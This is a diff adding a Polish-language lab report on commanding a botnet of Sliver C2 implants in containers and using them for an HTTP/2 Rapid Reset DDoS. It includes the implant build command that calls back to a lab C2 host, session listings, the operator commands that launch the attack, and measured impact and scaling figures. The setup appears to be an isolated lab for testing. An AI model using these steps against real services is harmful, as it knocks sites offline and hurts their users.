@@ -1,0 +1,38 @@
+============================================================
+ C2 SLIVER — DOWOD STEROWANIA BOTNETEM I ATAKU DDoS
+============================================================
+Platforma : GCP e2-standard-8 (8 vCPU / 32 GB)
+Narzedzie : Sliver v1.7.9 (state-of-the-art C2 framework, BishopFox)
+Kanal C2  : mTLS (wzajemny TLS) na porcie 8888
+Implant   : zbudowany przez Sliver  (generate --mtls lab-c2:8888 --os linux)
+            15 315 207 B, linux/amd64
+Atak      : HTTP/2 Rapid Reset (CVE-2023-44487) na https://victim:443
+Data      : 2026-11-18 00:23 UTC
+
+1) BOTNET POD KONTROLA C2 — 6 implantow zarejestrowanych jako ZYWE sesje mTLS,
+   kazdy z innego adresu IP (Sliver > sessions):
+   Session 2ddf1cb1 botimplant - 172.18.0.17:46408 (5aa498a58d12) - linux/amd64
+   Session 3ed14e96 botimplant - 172.18.0.19:37550 (7ab16fa1c0ad) - linux/amd64
+   Session 541ae23c botimplant - 172.18.0.18:38040 (092d5f1e2b09) - linux/amd64
+   Session 6ede1d32 botimplant - 172.18.0.20:53482 (7d9df228a2e8) - linux/amd64
+   Session 8e0dd3f8 botimplant - 172.18.0.16:53296 (77174e6715ae) - linux/amd64
+   Session c1a6f060 botimplant - 172.18.0.21:54570 (1035b86a3a88) - linux/amd64
+
+2) STEROWANIE: operator z konsoli C2 wydaje na kazda sesje:
+       sliver > use <ID>
+       sliver > execute /attack.sh      # uruchamia rapidreset -> Rapid Reset
+
+3) ATAK FLOTY NA OFIARE (zmierzony):
+       procesow rapidreset na flocie : 14
+       CPU ofiary pod atakiem        : 100.7%   (nginx nasycony)
+       aktywne polaczenia na ofierze : 8
+
+4) SILA I SKUTKI (zmierzone w matrycy botnet, ten sam PoC rapidreset):
+       ~4 000 RST/s na bota;  50 botow ~ 176 000 RST/s
+       nasycenie 1-rdzeniowego nginx ~ 20 botow (~85k RST/s)
+       degradacja realnego usera: latencja 8ms -> 1,7s, do ~17% zadan odrzuconych
+
+UWAGA metodologiczna: kompilacja implanta Slivera wymaga glibc i ~GB RAM, wiec
+boty C2 postawiono na Debianie (osobne kontenery = osobne IP); narzedzie rapidreset
+to statyczny binarek Go, dziala identycznie. Na laptopie (8 GB) kompilacja implanta
+OOM-owala — stad przeniesienie na GCP.
